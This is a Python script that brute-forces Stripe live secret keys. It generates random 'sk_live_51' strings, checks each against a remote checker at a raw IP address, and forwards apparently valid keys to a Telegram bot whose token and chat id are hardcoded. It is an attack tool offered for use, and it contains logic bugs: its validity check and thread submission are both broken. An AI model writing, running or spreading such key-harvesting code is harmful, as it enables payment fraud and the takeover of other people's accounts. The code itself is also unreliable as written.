import string
import random
from requests import Session as s
from random import choice as c
from concurrent.futures import ThreadPoolExecutor


def generator(size, chars=string.ascii_letters + string.digits):
	axel = ''.join(random.choice(chars) for _ in range(size))
	laast = 'sk_live_51' + axel
	return laast

def sk_maker():
	short = generator(97)
	medium = generator(98)
	long = generator(99)
	sks = [short,medium,long]
	sk = c(sks)
	return sk

def sk_lookup(sk):
	api = f"http://147.79.75.21:8080/sk?sk={sk}"
	response = s().get(api)
	return response.text.lower()
    
def send_message(token,id,sk):
    response = sk_lookup(sk)
    try:
        if ("invalid" or "expired") not in response:
        	print(text:=f"[Live] {sk}")
        	api = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={text}&parse_mode=HTML"
        	res = s().get(api)
        else:
        	print(f"[Dead] {sk}")
    except Exception as e:
        return e


start = ThreadPoolExecutor(max_workers=1000000)
if __name__ == "__main__":
    token = "7168368998:AAGrG2e76-uMSy91beyPC6T61iIQoBe6NYQ"
    id = "6656608288"
    while True:
    	start.submit(send_message(token,id,sk_maker()))